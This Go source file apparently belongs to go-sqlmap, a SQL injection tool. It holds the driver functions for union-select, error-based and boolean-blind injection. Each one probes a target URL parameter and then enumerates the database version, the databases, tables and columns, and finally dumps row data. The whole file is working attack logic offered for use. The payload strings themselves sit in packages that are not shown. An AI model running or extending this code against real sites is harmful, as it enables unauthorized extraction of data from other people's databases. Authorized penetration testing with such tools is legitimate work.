package start

import (
	"github.com/EmYiQing/go-sqlmap/constant"
	"github.com/EmYiQing/go-sqlmap/input"
	"github.com/EmYiQing/go-sqlmap/line"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/parse"
)

// RunUnionSelect UnionSelect注入
func RunUnionSelect(fixUrl parse.BaseUrl, params input.Input, suffixList []string) bool {
	log.Info("start union select injection...")
	suffix, key := line.GetOrderByNum(fixUrl, params.Param, suffixList)
	if key == 0 {
		return false
	}
	paramKey := params.Param
	fixUrl.Params[paramKey] = constant.UnionSelectUnionCondition
	pos := line.GetUnionSelectPos(suffix, fixUrl, paramKey, key)
	if pos.StartIndex == 0 {
		return false
	}
	line.GetVersion(pos, suffix, fixUrl, paramKey, key)
	line.GetCurrentDatabase(pos, suffix, fixUrl, paramKey, key)
	line.GetAllDatabases(pos, suffix, fixUrl, paramKey, key)
	if params.Database != "" {
		line.GetAllTables(pos, suffix, fixUrl, paramKey, key, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetColumns(pos, suffix, fixUrl, paramKey, key, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetData(pos, suffix, fixUrl, paramKey, key, params.Database, params.Table, params.Columns)
	}
	return true
}

// RunErrorBased ErrorBased注入
func RunErrorBased(target string, params input.Input, suffixList []string) bool {
	log.Info("start error based injection...")
	success, suffix := line.DetectErrorBased(target, suffixList)
	if !success {
		return false
	}
	if params.Beta == true {
		line.GetVersionByErrorBasedPolygon(target, suffix)
		line.GetCurrentDatabaseByErrorBasedPolygon(target, suffix)
		line.GetAllDatabasesByErrorBasedPolygon(target, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBasedPolygon(target, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBasedPolygon(target, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBasedPolygon(target, suffix, params.Database, params.Table, params.Columns)
		}
	} else {
		line.GetVersionByErrorBased(target, suffix)
		line.GetCurrentDatabaseByErrorBased(target, suffix)
		line.GetAllDatabasesByErrorBased(target, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBased(target, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBased(target, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBased(target, suffix, params.Database, params.Table, params.Columns)
		}
	}
	return true
}

// RunBoolBlind BoolBlind注入
func RunBoolBlind(target string, params input.Input, suffixList []string) bool {
	log.Info("start bool blind injection...")
	success, suffix := line.GetBoolBlindSuffix(target, suffixList)
	if !success {
		return false
	}
	line.GetVersionByBoolBlind(target, suffix)
	line.GetCurrentDatabaseByBoolBlind(target, suffix)
	line.GetAllDatabasesByBoolBlind(target, suffix)
	if params.Database != "" {
		line.GetAllTablesByBoolBlind(target, suffix, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetAllColumnsByBoolBlind(target, suffix, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetAllDataByBoolBlind(target, suffix, params.Database, params.Table, params.Columns)
	}
	return true
}
